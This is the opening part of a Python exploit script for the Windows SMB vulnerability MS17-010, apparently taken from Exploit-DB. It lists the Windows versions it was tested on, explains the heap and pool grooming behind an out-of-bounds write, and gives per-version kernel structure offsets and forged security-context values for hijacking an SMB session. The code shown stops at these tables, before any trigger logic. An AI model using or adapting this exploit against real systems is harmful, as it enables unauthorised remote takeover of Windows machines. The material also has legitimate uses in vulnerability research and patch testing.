#!/usr/bin/python
from impacket import smb, smbconnection
from mysmb import MYSMB
from struct import pack, unpack, unpack_from
import sys
import socket
import time

'''
MS17-010 exploit for Windows 2000 and later by sleepya

EDB Note: mysmb.py can be found here ~ https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/42315.py

Note:
- The exploit should never crash a target (chance should be nearly 0%)
- The exploit use the bug same as eternalromance and eternalsynergy, so named pipe is needed

Tested on:
- Windows 2016 x64
- Windows 10 Pro Build 10240 x64
- Windows 2012 R2 x64
- Windows 8.1 x64
- Windows 2008 R2 SP1 x64
- Windows 7 SP1 x64
- Windows 2008 SP1 x64
- Windows 2003 R2 SP2 x64
- Windows XP SP2 x64
- Windows 8.1 x86
- Windows 7 SP1 x86
- Windows 2008 SP1 x86
- Windows 2003 SP2 x86
- Windows XP SP3 x86
- Windows 2000 SP4 x86
'''

USERNAME = ''
PASSWORD = ''

'''
A transaction with empty setup:
- it is allocated from paged pool (same as other transaction types) on Windows 7 and later
- it is allocated from private heap (RtlAllocateHeap()) with no on use it on Windows Vista and earlier
- no lookaside or caching method for allocating it

Note: method name is from NSA eternalromance

For Windows 7 and later, it is good to use matched pair method (one is large pool and another one is fit
for freed pool from large pool). Additionally, the exploit does the information leak to check transactions
alignment before doing OOB write. So this exploit should never crash a target against Windows 7 and later.

For Windows Vista and earlier, matched pair method is impossible because we cannot allocate transaction size
smaller than PAGE_SIZE (Windows XP can but large page pool does not split the last page of allocation). But
a transaction with empty setup is allocated on private heap (it is created by RtlCreateHeap() on initialing server).
Only this transaction type uses this heap. Normally, no one uses this transaction type. So transactions alignment
in this private heap should be very easy and very reliable (fish in a barrel in NSA eternalromance). The drawback
of this method is we cannot do information leak to verify transactions alignment before OOB write.
So this exploit has a chance to crash target same as NSA eternalromance against Windows Vista and earlier.
'''

###########################
# info for modify session security context
###########################

WIN7_64_SESSION_INFO = {
	'SESSION_SECCTX_OFFSET': 0xa0,
	'SESSION_ISNULL_OFFSET': 0xba,
	'FAKE_SECCTX': pack('<IIQQIIB', 0x28022a, 1, 0, 0, 2, 0, 1),
	'SECCTX_SIZE': 0x28,
}

WIN7_32_SESSION_INFO = {
	'SESSION_SECCTX_OFFSET': 0x80,
	'SESSION_ISNULL_OFFSET': 0x96,
	'FAKE_SECCTX': pack('<IIIIIIB', 0x1c022a, 1, 0, 0, 2, 0, 1),
	'SECCTX_SIZE': 0x1c,
}

# win8+ info
WIN8_64_SESSION_INFO = {
	'SESSION_SECCTX_OFFSET': 0xb0,
	'SESSION_ISNULL_OFFSET': 0xca,
	'FAKE_SECCTX': pack('<IIQQQQIIB', 0x38022a, 1, 0, 0, 0, 0, 2, 0, 1),
	'SECCTX_SIZE': 0x38,
}

WIN8_32_SESSION_INFO = {
	'SESSION_SECCTX_OFFSET': 0x88,
	'SESSION_ISNULL_OFFSET': 0x9e,
	'FAKE_SECCTX': pack('<IIIIIIIIB', 0x24022a, 1, 0, 0, 0, 0, 2, 0, 1),
	'SECCTX_SIZE': 0x24,
}

# win 2003 (xp 64 bit is win 2003)
WIN2K3_64_SESSION_INFO = {
	'SESSION_ISNULL_OFFSET': 0xba,
	'SESSION_SECCTX_OFFSET': 0xa0,  # Win2k3 has another struct to keep PCtxtHandle (similar to 2008+)
	'SECCTX_PCTXTHANDLE_OFFSET': 0x10,  # PCtxtHandle is at offset 0x8 but only upperPart is needed
	'PCTXTHANDLE_TOKEN_OFFSET': 0x40,
	'TOKEN_USER_GROUP_CNT_OFFSET': 0x4c,
	'TOKEN_USER_GROUP_ADDR_OFFSET': 0x68,
}

WIN2K3_32_SESSION_INFO = {
	'SESSION_ISNULL_OFFSET': 0x96,
	'SESSION_SECCTX_OFFSET': 0x80,  # Win2k3 has another struct to keep PCtxtHandle (similar to 2008+)
	'SECCTX_PCTXTHANDLE_OFFSET': 0xc,  # PCtxtHandle is at offset 0x8 but only upperPart is needed
	'PCTXTHANDLE_TOKEN_OFFSET': 0x24,
	'TOKEN_USER_GROUP_CNT_OFFSET': 0x4c,
	'TOKEN_USER_GROUP_ADDR_OFFSET': 0x68,
}

# win xp
WINXP_32_SESSION_INFO = {
	'SESSION_ISNULL_OFFSET': 0x94,
	'SESSION_SECCTX_OFFSET': 0x84,  # PCtxtHandle is at offset 0x80 but only upperPart is needed
	'PCTXTHANDLE_TOKEN_OFFSET': 0x24,
	'TOKEN_USER_GROUP_CNT_OFFSET': 0x4c,
	'TOKEN_USER_GROUP_ADDR_OFFSET': 0x68,
}

WIN2K_32_SESSION_INFO = {
	'SESSION_ISNULL_OFFSET': 0x94,
	'SESSION_SECCTX_OFFSET': 0x84,  # PCtxtHandle is at offset 0x80 but only upperPart is needed
	'PCTXTHANDLE_TOKEN_OFFSET': 0x24,
	'TOKEN_USER_GROUP_CNT_OFFSET': 0x3c,
	'TOKEN_USER_GROUP_ADDR_OFFSET': 0x58,
}
